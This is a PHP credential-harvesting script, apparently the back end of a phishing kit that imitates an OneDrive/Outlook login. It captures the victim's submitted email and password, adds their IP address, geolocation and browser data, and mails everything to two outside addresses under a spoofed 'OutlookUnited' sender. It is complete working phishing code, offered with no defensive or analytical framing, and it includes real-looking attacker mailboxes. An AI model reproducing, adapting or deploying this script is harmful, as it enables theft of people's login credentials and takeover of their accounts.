<?php
$geo = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip=' . $_SERVER['REMOTE_ADDR']));
$country = $geo['geoplugin_regionName'] . ", " . $geo['geoplugin_countryName'];

function getIp() {
	$Iprotocol = $_SERVER['REMOTE_ADDR'];

	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$Iprotocol = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$Iprotocol = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	return $Iprotocol;
}

//* A sprinkle of pressure can change the situaion *//

$Iprotocol = $_SERVER['REMOTE_ADDR'];
$teaTime = date("m-d-Y g:i:a");
$browserID = $_SERVER['HTTP_USER_AGENT'];
$Host = gethostbyaddr($ip);
$email = $_POST['normad'];
$post_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$users = base64_encode($_POST['normad']);
$Iprotocol = getenv("REMOTE_ADDR");

$locationInfo = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip=' . $Iprotocol));
// $country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$datedTime = date("D/M/d, Y g(idea) a");
$leadTo = 'https://outlook.office.com/mail/inbox';

//* I resolved that it would take extreme measure to make dreams come alive with the right amount of effort *//

//* Dude Memes Morty Ricky Yang KingOfGrime SLime SLame SLide *//

$message = "NewOneDrive C;assic from $Iprotocol \n";
$message .= "Email : " . $_POST['normad'] . " \n";
$message .= "Password: " . $_POST['bandits'] . " \n";
$message .= "IP address: " . $Iprotocol . " \n";
$message .= "Confirm IP: " . $locationInfo . " \n";
$message .= "Country: " . $country . " \n";
$message .= "Date: " . $datedTime . " \n";
$message .= "CameFrom: " . $post_link . " \n";
$message .= "Browser: " . $browserID . " \n";

$to = "s.hmoni@yandex.com,mackabenr12@gmail.com";
$subject = "NewOneDrive Classic || $country";
$from = "From: OutlookUnited<yougotanew@adobelogz.com>";
$header = "MIME-Version: 1.0" . "\r\n";

mail($to, $subject, $message, $from);

?>